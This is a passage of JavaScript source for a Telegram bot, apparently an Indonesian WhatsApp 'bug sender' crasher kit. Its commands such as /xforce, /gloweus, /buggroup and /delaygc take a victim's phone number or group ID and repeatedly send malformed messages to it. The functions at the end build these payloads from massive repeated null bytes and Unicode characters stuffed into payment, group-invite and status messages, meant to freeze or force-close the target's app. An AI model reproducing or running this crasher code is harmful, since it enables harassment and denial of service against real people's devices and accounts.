‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : blank hard
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ?? 
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 15; i++) {
      await VnXblankdanz(sock, target)
        await new Promise(r => setTimeout(r, 700));
      await VnXBlankNewJirr(sock, target)
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// case memek ///
bot.command("xforce", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /xforce 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xforce
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : forclose click
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ?? 
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /xforce
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : forclose click
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : ?? 
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 50; i++) {
      await VnXBlankXFcClick(sock, target)
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG  ///
bot.command("gloweus", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply("🪧 ☇ Example : /gloweus 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const prosesText = `<blockquote><strong>𝐏𝐑𝐎𝐒𝐄𝐒 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /gloweus 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Process
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Crash ui
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 80% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Script`;

    const successText = `<blockquote><strong>𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘 𝐒𝐄𝐍𝐃 𝐁𝐔𝐆</strong></blockquote>

‹ 𝐓𝐚𝐫𝐠𝐞𝐭    : ${q}
‹ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝   : /gloweus 
‹ 𝐒𝐭𝐚𝐭𝐮𝐬    : Success
‹ 𝐄𝐟𝐟𝐞𝐜𝐭    : Crash ui
‹ 𝐏𝐨𝐭𝐞𝐧𝐭𝐢𝐚𝐥 : 80% ban
‹ 𝐒𝐜𝐫𝐢𝐩𝐭    : Zalindra Crashers Script`;

    const msg = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption: prosesText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 65; i++) {
      await VnXCrashUrlUiNew(sock, target)
        await new Promise(r => setTimeout(r, 600));
      await VnXLocaUiNew(sock, target)
        await new Promise(r => setTimeout(r, 1000));
      }
    })();

    setTimeout(async () => {
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          msg.message_id,
          null,
          successText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}` }]
              ]
            }
          }
        );
      } catch (e) {
        console.log("Edit error:", e.message);
      }
    }, 4000);

  } catch (err) {
    console.log("Xall error:", err.message);
  }
});
/// CASE BUG GB ///
bot.command("buggroup", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  const chatId = ctx.chat.id;
  const args = ctx.message.text.trim().split(/\s+/).slice(1);
  const groupJid = args[0];

  try {
    
    if (sessions.size === 0) {
      return ctx.reply("❌ ⵢ Sender Not Connected\nPlease /connect");
    }

  
    if (!groupJid || !groupJid.endsWith("@g.us")) {
      return ctx.reply(
        "❌ Format salah\nContoh:\n/buggroup 120363025847363@g.us"
      );
    }

  
    if (!sock) {
      return ctx.reply("❌ WhatsApp socket tidak aktif");
    }

  
    const processMessage = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption: `
<blockquote><strong>｢ ⸸ ｣ Galaxy Proses Sending Bug</strong></blockquote>
⌑ Target
ᯓ➤ ${groupJid}
⌑ Type
ᯓ➤ Send Message Group
⌑ Status
ᯓ➤ Process
<blockquote><i>By @seanoffcx</i></blockquote>
`,
        parse_mode: "HTML"
      }
    );

   
    for (let i = 0; i < 100; i++) {
      await bokep(sock, groupJid);
    }

    
    await ctx.telegram.editMessageCaption(
      chatId,
      processMessage.message_id,
      undefined,
      `
<blockquote><strong>｢ ⸸ ｣ Galaxy Proses Sending Bug</strong></blockquote>
⌑ Target
ᯓ➤ ${groupJid}
⌑ Type
ᯓ➤ Send Message Group
⌑ Status
ᯓ➤ Success
<blockquote><i>By @seanoffcx</i></blockquote>
`,
      {
        parse_mode: "HTML"
      }
    );

  } catch (e) {
    console.log("BUGGROUP ERROR:", e);

    return ctx.reply(
      `❌ Error Buggroup:\n${e.message}`
    );
  }
});
/// CASE BUG GB ///
bot.command("delaygc", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
  const chatId = ctx.chat.id;
  const args = ctx.message.text.trim().split(/\s+/).slice(1);
  const groupJid = args[0];

  try {

    
    if (sessions.size === 0) {
      return await ctx.reply(
        "❌ ⵢ Sender Not Connected\nPlease /connect"
      );
    }

    
    if (!groupJid || !groupJid.endsWith("@g.us")) {
      return await ctx.reply(
        "❌ Format salah\nContoh:\n/delaygc 120363025847363@g.us"
      );
    }

   
    if (!sock) {
      return await ctx.reply("❌ WhatsApp sensaion tidak aktif");
    }

   
    const processMessage = await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/0kh18e.jpg" },
      {
        caption: `
<blockquote><strong>｢ ⸸ ｣ Galaxy Proses Sending Bug</strong></blockquote>
⌑ Target
ᯓ➤ ${groupJid}
⌑ Type
ᯓ➤ Send Message Group
⌑ Status
ᯓ➤ Process
<blockquote><i>By @seanoffcx</i></blockquote>
`,
        parse_mode: "HTML"
      }
    );

    const processMessageId = processMessage.message_id;

 
    for (let i = 0; i < 100; i++) {
      await bokep(sock, groupJid);
    }

    
    await ctx.telegram.editMessageCaption(
      chatId,
      processMessageId,
      undefined,
      `
<blockquote><strong>｢ ⸸ ｣ Galaxy Proses Sending Bug</strong></blockquote>
⌑ Target
ᯓ➤ ${groupJid}
⌑ Type
ᯓ➤ Send Message Group
⌑ Status
ᯓ➤ Success
<blockquote><i>By @seanoffcx</i></blockquote>
`,
      {
        parse_mode: "HTML"
      }
    );

  } catch (e) {
    console.error("DELAYGC ERROR:", e);

    return await ctx.reply(
      `❌ Error Delaygc:\n${e.message}`
    );
  }
});
/// Hapus bug ///
bot.command("hapusbug", checkWhatsAppConnection, async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const args = ctx.message.text.trim().split(/\s+/).slice(1);
  const q = args[0];

  
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return ctx.reply(
      "❌ You are not authorized to view the premium list."
    );
  }

 
  if (sessions.size === 0) {
    return ctx.reply(
      "❌ ⵢ Sender Not Connected\nPlease /connect"
    );
  }

  
  if (!sock) {
    return ctx.reply(
      "❌ WhatsApp socket tidak aktif"
    );
  }

  
  if (!q) {
    return ctx.reply(
      "Cara Pakai Nih Njing!!!\n/hapusbug 62xxx"
    );
  }

  let pepec = q.replace(/[^0-9]/g, "");

  if (pepec.startsWith("0")) {
    return ctx.reply(
      "Contoh : /hapusbug 62xxx"
    );
  }

  let target = pepec + "@s.whatsapp.net";

  try {

  
    const processMessage = await ctx.replyWithPhoto(
      { source: fs.readFileSync("./image/zalindraoffc.jpg") },
      {
        caption: `
<blockquote><strong>｢ ⸸ ｣ Zalindra Clear Bug Process</strong></blockquote>
⌑ Target
ᯓ➤ ${target}
⌑ Type
ᯓ➤ Clear Personal Bug
⌑ Status
ᯓ➤ Process
<blockquote><i>By team Zalindra</i></blockquote>
`,
        parse_mode: "HTML"
      }
    );

  
    for (let i = 0; i < 3; i++) {
      await sock.sendMessage(target, {
        text: "𝐂𝐈𝐊𝐈𝐃𝐀𝐖 𝐂𝐋𝐄𝐀𝐑 𝐁𝐔𝐆\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n𝐒𝐄𝐍𝐙𝐘 𝐆𝐀𝐍𝐓𝐄𝐍𝐆"
      });
    }

    
    await ctx.telegram.editMessageCaption(
      chatId,
      processMessage.message_id,
      undefined,
      `
<blockquote><strong>｢ ⸸ ｣ Zalindra Clear Bug Process</strong></blockquote>
⌑ Target
ᯓ➤ ${target}
⌑ Type
ᯓ➤ Clear Personal Bug
⌑ Status
ᯓ➤ Success
<blockquote><i>By team Zalindra</i></blockquote>
`,
      {
        parse_mode: "HTML"
      }
    );

    await ctx.reply("Succes Clear Bugs");

  } catch (err) {
    console.error("HAPUSBUG ERROR:", err);

    await ctx.reply(
      `Ada kesalahan saat mengirim bug.\n${err.message}`
    );
  }
});
// ------------ (  FUNCTION BUGS ) -------------- \\
async function FrezeeChat(target) {
await sock.relayMessage(target, {
 interactiveMessage: {
 body: {
 text: "MakLo(RcB)"
 },
 nativeFlowMessage: {
buttons: [
{
name: "review_and_pay",
buttonParamsJson: JSON.stringify({
 currency: "IDR",
 total_amount: { 
value: 999999999999, 
 offset: 100 
 },
 reference_id: "\u0000".repeat(5000),
 order: {
 status: "pending",
 items: [
{
 name: "𑇂𑆵𑆴𑆿".repeat(9999),
amount: { value: 100000, offset: 100 },
quantity: 99999
 }
 ]
}
})
}
],
},
},
}, { participant: { jid: target }});
}



async function VnXDelayHardV2Sw(sock, target, mention = true) {
  const vnxfcnih = generateWAMessageFromContent(
    target,
    {
      interactiveResponseMessage: {
        body: {
          text: "VnX Anti Ampos",
          format: 1
        },
        footer: {
          text: "VnX Is Here"
        },
        nativeFlowResponseMessage: {
          name: "galaxy_message",
          paramsJson: `{\"wa_flow_response_params\":{\"title\":${"\u0000".repeat(250000)}}}`,
          version: 3,
        }
      }
    },
    { userJid: target },
  );
  await sock.relayMessage('status@broadcast', vnxfcnih.message, {
    additionalNodes: [
      {
        tag: 'meta',
        attrs: {},
        content: [
          {
            tag: 'mentioned_users',
            attrs: {},
            content: [
              { tag: 'to', attrs: { jid: target }, content: undefined },
            ],
          },
        ],
      },
    ],
    statusJidList: [target],
    messageId: vnxfcnih.key.id,
  });
  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: { protocolMessage: { key: vnxfcnih.key, type: 25 } },
        },
      },
      {},
    );
  }
  await sleep(1500);
}

async function VnXBlankXFcClick(sock, target) {
 console.log(`VnX sending blank x fc click message to ${target}`);

 await sock.relayMessage(target, {
   groupInviteMessage: {
     groupJid: "1@g.us",
     inviteCode: "ꦽ".repeat(5000),
     inviteExpiration: "99999999999",
     groupName: "༑ ▾ VnX Is Here ▾ ༑" + "ꦾ".repeat(25000),
     caption: " x " + "ꦾ".repeat(5000),
     body: { text: "\n" + "ោ៝".repeat(25000) },
     contextInfo: {
      quotedMessage: {
        paymentInviteMessage: {
          serviceType: 1,
          expiryTimestamp: Math.floor(Date.now() / 1000) + 60
         }
       }
     }
   }
 }, { participant: { jid: target } });
}

// --- Jalankan Bot --- //
(async () => {
  try {
    console.clear();

    currentMode = getMode();

    
    await startSesi();

    
    await bot.launch();

    process.once("SIGINT", () => bot.stop("SIGINT"));
    process.once("SIGTERM", () => bot.stop("SIGTERM"));

    console.log("✅ Bot Telegram launched");
    console.log("🟢 System ready");

  } catch (err) {
    console.error("❌ Failed to start:", err);

    setTimeout(() => {
      
      process.exit(1);
    }, 3000);
  }
})();
